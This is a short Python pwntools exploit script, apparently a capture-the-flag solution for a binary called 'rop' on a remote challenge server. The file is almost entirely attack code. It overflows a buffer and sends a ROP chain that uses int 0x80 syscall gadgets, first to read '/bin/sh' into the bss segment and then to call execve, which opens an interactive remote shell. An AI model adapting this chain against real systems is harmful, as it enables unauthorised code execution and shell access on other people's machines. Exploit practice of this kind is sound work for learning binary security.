from pwn import *
context.log_level = "debug"

#r = process("./rop")
r = remote("pwn.sixstars.team", 22020)
elf = ELF("./rop")

peax = 0x080b7e56
pebx = 0x080481c9
pecx = 0x080de509
pedx = 0x0806ecaa

#['0x806c925', '0x806f2b0', '0x807a655', '0x807a65e', '0x80b6b68', '0x80b6c34', '0x80b7772', '0x80d2643']

sys = 0x806f2b0
bss = 0x80e9800

sh = 'a'*0x9+'a'*0x4
sh += p32(pebx) + p32(0) 
sh += p32(pecx) + p32(bss)
sh += p32(pedx) + p32(100)
sh += p32(peax) + p32(0x3)
sh += p32(sys)

sh += p32(pebx) + p32(bss)
sh += p32(pecx) + p32(0)
sh += p32(pedx) + p32(0)
sh += p32(peax) + p32(0xb)
sh += p32(sys)

r.sendline(sh)
r.sendline("/bin/sh\x00")
r.interactive()
